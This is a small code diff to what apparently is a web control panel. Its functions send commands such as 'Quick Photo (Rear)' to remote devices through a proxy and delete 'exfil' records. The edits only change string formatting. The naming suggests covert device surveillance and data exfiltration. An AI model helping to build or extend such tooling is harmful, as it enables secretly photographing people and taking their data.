@@ -629,16 +629,16 @@ app.get('/', (req, res) => {
             label = 'Quick Photo (Rear)';
         }
 
-        const fullUrl = `/proxy${path}${path.includes('?') ? '&' : '?'}deviceId=${encodeURIComponent(deviceId)}`;
+        const fullUrl = '/proxy' + path + (path.includes('?') ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
         fetch(fullUrl)
             .then(r => {
                 if (r.ok) {
-                    showToast(`[DISPATCH_SUCCESS] ${label} executed.`);
+                    showToast('[DISPATCH_SUCCESS] ' + label + ' executed.');
                 } else {
-                    showToast(`Dispatch failed (Status ${r.status})`, "error");
+                    showToast('Dispatch failed (Status ' + r.status + ')', 'error');
                 }
             })
-            .catch(err => showToast("Network error dispatching command", "error"));
+            .catch(err => showToast('Network error dispatching command', 'error'));
     }
 
     function deleteExfil(id) {
